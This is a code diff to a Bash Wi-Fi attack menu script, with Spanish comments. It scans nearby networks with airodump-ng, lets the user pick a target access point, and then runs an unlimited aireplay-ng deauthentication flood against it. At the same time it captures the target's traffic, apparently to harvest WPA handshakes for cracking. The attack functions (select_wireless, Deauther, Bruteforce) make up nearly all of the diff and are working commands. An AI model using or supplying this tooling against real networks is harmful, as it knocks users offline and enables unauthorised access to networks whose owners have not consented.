@@ -137,99 +137,134 @@ select_wireless(){
     if [[ -z "$MON_INTERFACE" ]];then
         echo "Not in monitor mode"
         sleep 3    
-    else
-        
-        
-        rm ./data_collected/network_dump/*
-        
-        if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-            # Estamos en un entorno gráfico
-            x-terminal-emulator -e "sudo timeout 25 airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one"
-        else
-            # No hay entorno gráfico, ejecutarlo en la terminal actual
-            sudo timeout 10 airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one
-        fi
-
-        if [[ ! -f "./data_collected/network_dump/networks-01.csv" ]];then
-            echo "File csv with network not found"
-            exit 1
-        fi
-        
-
-        cd  ./data_collected/network_dump/
-        FILE="networks-01.csv"
-
-        #Borrar informacion que no nos interesa.
-        sed -i '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' $FILE
-
-        # Declarar un array vacío
-        declare -a NETWORKS
-
-        # Contador de filas (ID)
-        COUNT=0
-
-        # Leer el archivo línea por línea usando 'process substitution'
-        while IFS=',' read -r BSSID FirstSeen LastSeen Channel Speed Privacy Cipher Auth Power Beacons IV LAN_IP ID_Length ESSID Key; do
-            # Solo almacenar hay algun campo con informacion, si todo es vacio no almazenara.
-            if [[ -n "$BSSID" && -n "$Channel" && -n "$Privacy" && -n "$Cipher" && -n "$Auth" && -n "$Beacons" && -n "$ESSID" ]]; then
-                # Guardar todos los datos en el array (para referencia interna)
-                NETWORKS+=("$BSSID,$Channel,$Privacy,$Cipher,$Auth,$Beacons,$ESSID")
-
-                # Formatear solo los datos a mostrar
-                LINE=$(printf "%-20s %-18s %-10s %-7s %-10s" "$BSSID" "$ESSID" "$Privacy" "$Beacons" "$Cipher")
-                
-                # Mostrar en pantalla
-                echo "$COUNT  $LINE"
-
-                # Incrementar el contador
-                COUNT=$((COUNT + 1))
-            fi
-        done < <(tail -n +2 "$FILE")  # Leer desde la segunda línea
-
-        # Solicitar entrada del usuario
-        read -p "Introduce un número de ID para ver su información: " USER_ID
-
-        # Mostrar la información correspondiente al ID
-        if [[ $USER_ID =~ ^[0-9]+$ ]] && [[ $USER_ID -ge 1 ]] && [[ $USER_ID -lt ${#NETWORKS[@]} ]]; then
-            echo "Información completa seleccionada:"
-            IFS=',' read -r BSSID Channel Privacy Cipher Auth Beacons ESSID <<< "${NETWORKS[$USER_ID]}"
-
-            BSSID_VAR="$BSSID"
-            CHANNEL_VAR="$Channel"
-            PRIVACY_VAR="$Privacy"
-            CIPHER_VAR="$Cipher"
-            AUTH_VAR="$Auth"
-            BEACONS_VAR="$Beacons"
-            ESSID_VAR="$ESSID"
-
-            echo "$BSSID_VAR $ESSID_VAR"
-
-        else
-            echo "ID inválido."
-        fi
-
-        rm $FILE
-        
-        cd .. && cd ..        
-
-
     fi
+        
+        
+    rm ./data_collected/network_dump/*
+        
+    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
+        # Estamos en un entorno gráfico
+        x-terminal-emulator -e "sudo timeout 25 airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one"
+    else
+        # No hay entorno gráfico, ejecutarlo en la terminal actual
+        sudo timeout 10 airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one
+    fi
+
+    if [[ ! -f "./data_collected/network_dump/networks-01.csv" ]];then
+        echo "File csv with network not found"
+        exit 1
+    fi
+
+
+    cd  ./data_collected/network_dump/
+    FILE="networks-01.csv"
+
+    #Borrar informacion que no nos interesa.
+    sed -i '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' $FILE
+
+    # Declarar un array vacío
+    declare -a NETWORKS
+
+    # Contador de filas (ID)
+    COUNT=0
+
+    # Leer el archivo línea por línea usando 'process substitution'
+    while IFS=',' read -r BSSID FirstSeen LastSeen Channel Speed Privacy Cipher Auth Power Beacons IV LAN_IP ID_Length ESSID Key; do
+    # Solo almacenar hay algun campo con informacion, si todo es vacio no almazenara.
+        if [[ -n "$BSSID" && -n "$Channel" && -n "$Privacy" && -n "$Cipher" && -n "$Auth" && -n "$Beacons" && -n "$ESSID" ]]; then
+            # Guardar todos los datos en el array (para referencia interna)
+            NETWORKS+=("$BSSID,$Channel,$Privacy,$Cipher,$Auth,$Beacons,$ESSID")
+
+            # Formatear solo los datos a mostrar
+            LINE=$(printf "%-20s %-18s %-10s %-7s %-10s" "$BSSID" "$ESSID" "$Privacy" "$Beacons" "$Cipher")
+
+            # Mostrar en pantalla
+            echo "$COUNT  $LINE"
+
+            # Incrementar el contador
+            COUNT=$((COUNT + 1))
+        fi
+    done < <(tail -n +2 "$FILE")  # Leer desde la segunda línea
+
+    # Solicitar entrada del usuario
+    read -p "Enter an ID number to view its information: " USER_ID
+
+    # Mostrar la información correspondiente al ID
+    if [[ $USER_ID =~ ^[0-9]+$ ]] && [[ $USER_ID -ge 1 ]] && [[ $USER_ID -lt ${#NETWORKS[@]} ]]; then
+        echo "Selected complete information:"
+        IFS=',' read -r BSSID Channel Privacy Cipher Auth Beacons ESSID <<< "${NETWORKS[$USER_ID]}"
+
+        BSSID_VAR="$BSSID"
+        CHANNEL_VAR="$Channel"
+        PRIVACY_VAR="$Privacy"
+        CIPHER_VAR="$Cipher"
+        AUTH_VAR="$Auth"
+        BEACONS_VAR="$Beacons"
+        ESSID_VAR="$ESSID"
+
+        echo "$BSSID_VAR $ESSID_VAR"
+
+    else
+        echo "invalid ID ."
+    fi
+
+    rm $FILE
+        
+    cd .. && cd ..
+
 }
 
+TIMEOUT=""
 
 Deauther(){
 
-if [[ -z "$BSSID" ]];then
-    echo "There's not a BSSID in usage"
-    exit 1
-fi
+    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
+        # Estamos en un entorno gráfico
+        x-terminal-emulator -e " timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE"
+    else
+        # No hay entorno gráfico, ejecutarlo en la terminal actual
+        timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE
+    fi
 
-if [[ -z "$Channel" ]];then
-    echo "There's not a Channel set in usage"
-    exit 1
-fi
+}
 
-sleep 2
+Bruteforce(){
+    
+    if [[ -z "$BSSID_VAR" ]];then
+        echo "There's not a BSSID in usage"
+        exit 1
+    fi
+
+    if [[ -z "$CHANNEL_VAR" ]];then
+        echo "There's not a Channel set in usage"
+        exit 1
+    fi
+
+    if [[ -z "$MON_INTERFACE" ]];then
+        echo "Interface it's not in monitor mode"
+    fi
+    read -p "Set a time to run the attack recomended at least 20. MIN 10 MAX 200" TIMEOUT_USR
+
+    TIMEOUT=$TIMEOUT_USR
+
+    if [[ $TIMEOUT =~ ^[0-9]+$ ]] && [[ $TIMEOUT -ge 10 ]] && [[ $TIMEOUT -lt 200 ]];then
+
+         if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
+            # Estamos en un entorno gráfico
+            Deauther &
+            x-terminal-emulator -e " timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE"
+        else
+            # No hay entorno gráfico, ejecutarlo en la terminal actual
+            Deauther &
+            timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE
+        
+            #############01:11:07  wlan0mon is on channel 14, but the AP uses channel 11#######
+        fi
+    
+    else
+        echo "Invalid Time number"
+    fi
+
 }
 
 menu(){
@@ -292,7 +327,7 @@ menu(){
             2) monitor_mode;;
             3) manager_mode ;;
             4) select_wireless ;;
-            5) Deauther ;;
+            5) Bruteforce ;;
             6) echo ""; hostname -I ;;
             7) echo ""; free -h ;;
             8) echo ""; uptime ;;
